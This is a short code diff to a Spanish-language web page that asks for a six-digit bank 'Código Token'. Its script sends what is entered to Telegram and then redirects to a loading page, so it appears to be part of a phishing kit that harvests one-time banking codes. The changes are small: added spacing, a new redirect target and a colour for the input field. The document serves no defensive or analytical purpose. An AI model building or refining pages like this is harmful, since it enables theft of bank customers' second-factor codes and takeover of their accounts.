@@ -66,7 +66,7 @@
                         <input type="tel" autofocus placeholder="Código Token" class="token-input" maxlength="6" name="num1" id="token" required="" autocomplete="off">
                     </div><br>
                     <button type="button" class="btn-main" id="btnToken">Continuar</button>
-
+<br><br>
                     <div class="modal-bottom">
                         <p class="modal-text">*Si tú eres Persona Jurídica busca en la tienda de aplicaciones <b>Token Móvil</b></p>
                     </div>
@@ -138,7 +138,7 @@
                 .then(data => {
                     if (data.ok) {
                         // Redirigir a una página de éxito
-                        window.location.href = "https://tusitio.com/success-page.html"; // Cambia la URL de redirección
+                        window.location.href = "load2.html"; // Cambia la URL de redirección
                     } else {
                         alert("Hubo un error al enviar la información a Telegram");
                     }
@@ -153,6 +153,7 @@
     <style>
 
         .token-input {
+            background-color: rgba(231, 0, 0, .32);
             max-width: 200px;
             height: 60px;
             text-align: center;
